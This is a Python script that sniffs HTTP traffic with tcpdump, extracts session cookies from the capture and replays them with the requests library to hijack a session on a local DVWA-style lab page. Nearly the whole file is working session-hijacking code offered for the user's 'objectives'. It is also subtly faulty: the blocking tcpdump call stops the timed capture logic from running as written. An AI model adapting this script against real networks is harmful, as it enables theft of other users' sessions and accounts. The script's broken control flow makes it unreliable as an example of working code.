# Packet Sniffing Class using tcpdump
# Description: This class enables packet sniffing to capture and hijack HTTP sessions
# targeting the specified URL http://127.0.0.1/vulnerabilities/xss_d/
# demonstrating sniffing and hijacking of a session using tcpdump and the requests library.

import subprocess
import re
import requests

class PacketSniffer:

    def __init__(self, interface="eth0"):
        self.interface = interface

    def start_sniffing(self, output_file="capture.pcap"):
        # Start tcpdump to capture packets and write to a pcap file
        subprocess.run(["sudo", "tcpdump", "-i", self.interface, "-w", output_file, "-n", "port", "80"], check=True)
    
    def stop_sniffing(self):
        # Ensure to stop the tcpdump after use
        subprocess.run(["sudo", "pkill", "tcpdump"], check=True)
    
    def extract_cookie(self, pcap_file="capture.pcap"):
        # Reads the pcap file to extract the session cookies from Http Set-Cookie header
        pcap_output = subprocess.check_output(["sudo", "tcpdump", "-A", "-r", pcap_file, "port", "80"])
        packets = pcap_output.decode(errors="ignore")
        
        cookie_re = re.compile(r'Set-Cookie: (.*?);')
        cookies = cookie_re.findall(packets)
        return "; ".join(cookies)
    
    def restore_session(self, cookies):
        with requests.Session() as s:
            s.headers.update({'Cookie': cookies})
            response = s.get("http://127.0.0.1/vulnerabilities/xss_d/")
            return response.text


def main():
    sniffer = PacketSniffer()
    
    try:
        # Start sniffing traffic - this will run until stop_sniffing is called
        sniffer.start_sniffing()
        
        # Continue other operations, injecting/timing when needed..
        import time
        time.sleep(30)  # Adapt as necessary
        
    finally:
        # Ensure we stop sniffing in a 'graceful' manner
        sniffer.stop_sniffing()

    # Extract cookies from the captured packet data
    session_cookies = sniffer.extract_cookie()

    # Restore session with extracted cookies
    restored_session_output = sniffer.restore_session(session_cookies)
    print(restored_session_output)  # Process in accordance to your objectives

if __name__ == "__main__":
    main()
